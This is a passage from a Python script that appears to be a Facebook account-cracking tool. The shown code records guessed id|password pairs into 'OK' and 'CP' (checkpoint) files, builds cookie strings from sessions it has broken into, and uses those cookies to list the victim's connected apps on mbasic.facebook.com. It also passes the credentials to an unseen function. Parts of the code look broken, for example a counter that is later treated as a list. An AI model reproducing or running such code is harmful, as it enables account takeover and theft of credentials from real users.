				print(f'\r{P}{K} [{time.strftime("JONES")}-CP] {idf} │ {pw} {P}')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{P}{H} [{time.strftime("JONES")}-OK] {idf} │ {pw} {P}')
				cek_apk(kuki)
				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
				jones(idf,pw,kuki)
				ok.append(wrt)
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
#----------------[ ID-CHECKER ]--------------------------#

def cek_apk(kuki):
	session = requests.Session()
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s  \033[0m➛ %s%s"%(P,H,game[i].replace("Added on"," Added on")))
	except AttributeError:
		print ("\r    %s\033[0m cookie invalid"%(M))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s  \033[0m➛ %s"%(P,game[i].replace("Expired"," Expired")))
	except AttributeError:
		print ("\r    %s \033[0mcookie invalid"%(M))
#-----------------------[ SYSTEM-CONTROL ]--------------------#

if __name__=='__main__':
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('data')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	login()

